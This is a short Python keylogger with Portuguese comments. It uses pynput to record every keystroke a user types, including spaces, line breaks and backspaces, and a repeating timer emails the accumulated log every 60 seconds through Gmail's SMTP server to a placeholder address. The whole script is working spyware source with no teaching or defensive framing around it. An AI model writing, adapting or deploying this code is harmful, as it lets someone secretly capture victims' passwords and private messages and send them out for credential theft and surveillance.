from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

EMAIL_ORIGEM  = "xxx@gmail.com"
EMAIL_DESTINO = "yyy@gmail.com"
SENHA_EMAIL   = "senha_do_email"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Log de Teclas'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar email: {e}")
        
        log = ""
        
    # Envia o email a cada 60 segundos
    Timer(60, enviar_email).start()
        
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass # Ignorar control, shift, etc...

#Inicia keylog e o envio automático

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join() 
          
        